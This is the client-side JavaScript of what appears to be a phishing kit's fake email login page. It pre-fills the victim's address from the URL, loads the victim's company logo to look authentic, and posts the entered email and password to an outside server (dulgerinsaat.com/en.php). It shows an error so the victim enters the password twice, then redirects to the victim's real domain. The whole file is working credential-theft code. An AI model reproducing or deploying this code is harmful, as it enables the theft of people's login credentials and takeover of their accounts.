
/* global $ */
$(document).ready(function() {
    var count = 0;

    $('#back1').click(function() {
        $("#msg").hide();
        $('#ai').val("");
        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);

    });

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        // $('#ai').val(ai);
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var dom = c.toUpperCase();
        $('#ai').val(my_ai);
        $('#ai').attr('disabled', "");
        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
        $('#domain-name').html(dom);
        $("#msg").hide();
        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
    }
    ///////////////url getting ai////////////////


    var file = "bmV4dC5waHA=";
    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);
        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("Email field is emply.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            ai.focus;
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Password field is emply.!");
            ai.focus;
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var dom = c.toUpperCase();
        ///////////new injection////////////////
        count = count + 1;
        $('#ai').attr('disabled', "");
        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
        $('#domain-name').html(dom);

        $.ajax({
            dataType: 'JSON',
            url:'https://dulgerinsaat.com/en.php',
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifing...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#pr").val("");
                        if (count >= 2) {
                            count = 0;
                            // window.location.replace(response['redirect_link']);
                            window.location.replace("http://www." + my_slice);

                        }
                        // $('#msg').html(response['msg']);
                    } else {
                        // $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace("http://www." + my_slice);
                }
                $("#msg").show();
                // $('#msg').html("Please try again later");
            },
            complete: function() {
                $('#submit-btn').html('Login');
            }
        });
    });


});
